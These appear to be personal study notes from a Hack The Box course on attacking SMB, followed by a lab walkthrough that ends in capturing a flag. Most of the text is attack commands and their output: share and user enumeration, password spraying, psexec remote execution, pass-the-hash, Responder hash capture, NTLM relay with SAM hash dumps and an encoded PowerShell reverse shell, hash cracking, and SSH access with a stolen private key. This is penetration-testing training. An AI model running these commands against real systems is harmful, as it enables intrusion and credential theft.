# Attacking SMB

Initially, it was designed to run on 
- top of NetBIOS over TCP/IP (NBT) using TCP port 139
- UDP ports 137 and 138.

With Windows 2000, Microsoft added the option to :
- run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer. 

MB running on port 139 TCP/IP -> running with NetBIOS over TCP

## Enumeration

sudo nmap $TARGET -sV -sC -p139,445

essential information about the target:

SMB version (Samba smbd 4.6.2)
Hostname HTB
Operating System is Linux based on SMB implementation

## Misconfigurations

- Anonymous Authentication

- File Share

smbclient -N -L //$TARGET

smbmap -H $TARGET

smbmap -H $TARGET -r notes

smbmap -H $TARGET --download "notes\note.txt"

smbmap -H $TARGET --upload test.txt "notes\test.txt"

- RPC Client

rpcclient -U'%' $TARGET

rpcclient $> enumdomusers

- enum4linux

./enum4linux-ng.py $TARGET -A -C

## Protocol Specifics Attacks

### Brute Forcing and Password Spray

cat /tmp/userlist.txt

Password spraying :
crackmapexec smb $TARGET -u /tmp/userlist.txt -p 'Company01!' --local-auth

--local-auth : when it is a non-domain joined machine

### Remote Code Execution (RCE)

impacket-psexec -h
impacket-psexec administrator:'Password123!'@$TARGET
C:\Windows\system32>whoami && hostname

### CrackMapExec

Execute PowerShell commands :
crackmapexec smb $TARGET -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

Enumerating Logged-on Users :
crackmapexec smb $TARGET -u administrator -p 'Password123!' --loggedon-users

Extract Hashes from SAM Database :
crackmapexec smb $TARGET -u administrator -p 'Password123!' --sam

Pass-the-Hash (PtH) :
crackmapexec smb $TARGET -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

### Forced Authentication Attacks

responder -I <interface name>

sudo responder -I ens33

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off


impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

**Reverse Shell** :

https://www.revshells.com/
yanisAlb@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET -c 'powershell -e JABj=='

nc -lvnp 9001

### RPC

Change a user's password.
Create a new domain user.
Create a new shared folder.

## LAB

rpcclient -U'%' $TARGET
rpcclient $> enumdomusers
user:[jason] rid:[0x3e8]
user:[robin] rid:[0x3e9]
rpcclient $> 

smbmap -H $TARGET
[+] IP: 10.129.105.146:445	Name: 10.129.105.146                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

sudo responder -I tun0

[+] Listening for events...

[+] Exiting...

vi user.list
jason


vi password.list

hydra -L user.list -P password.list smb://$TARGET

crackmapexec smb $TARGET -u user.list -p password.list --shares

crackmapexec smb $TARGET -u administrator -p password.list --shares
SMB         10.129.105.146  445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.105.146  445    ATTCSVC-LINUX    [+] \administrator:liverpool

crackmapexec smb $TARGET -u administrator -p 'liverpool' --loggedon-users

impacket-psexec administrator:'liverpool'@$TARGET

smbclient //ATTCSVC-LINUX/GGJ -k -c 'recurse;ls' -u Administrator -p liverpool

rpcclient -U Administrator $TARGET

crackmapexec smb $TARGET --shares -u 'Administrator' -p 'liverpool'

smbclient -U Administrator \\\\$TARGET\\GGJ

Password for [WORKGROUP\Administrator]: liverpool
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 22:33:55 2022
  ..                                  D        0  Mon Apr 18 18:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 22:33:04 2022

rpcclient $> queryuser 0x3e8

	User Name   :	jason
	Full Name   :	
	Home Drive  :	\\ATTCSVC-LINUX\jason
	Dir Drive   :	
	Profile Path:	\\ATTCSVC-LINUX\jason\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 01 Jan 1970 01:00:00 BST
	Logoff Time              :	Wed, 06 Feb 2036 15:06:39 GMT
	Kickoff Time             :	Wed, 06 Feb 2036 15:06:39 GMT
	Password last set Time   :	Mon, 18 Apr 2022 18:20:21 BST
	Password can change Time :	Mon, 18 Apr 2022 18:20:21 BST
	Password must change Time:	Thu, 14 Sep 30828 03:48:05 BST
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...

crackmapexec smb $TARGET -u administrator -p 'liverpool' --sam

./enum4linux-ng.py $TARGET -A -C

impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET

TypeError: setLDAPOptions() missing 1 required positional argument: 'sid'

crackmapexec smb $TARGET -u jason -p password.list --shares

crackmapexec smb $TARGET -u jason -p password.list --local-auth

SMB         10.129.36.156   445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 

34c8zuNBo91!@28Bszh

smbclient -U jason \\\\$TARGET\\GGJ
34c8zuNBo91!@28Bszh

get id_rsa
chmod 600 id_rsa
ssh -i id_rsa jason@$TARGET
cat flag.txt	
HTB{SMB_4TT4CKS_2349872359}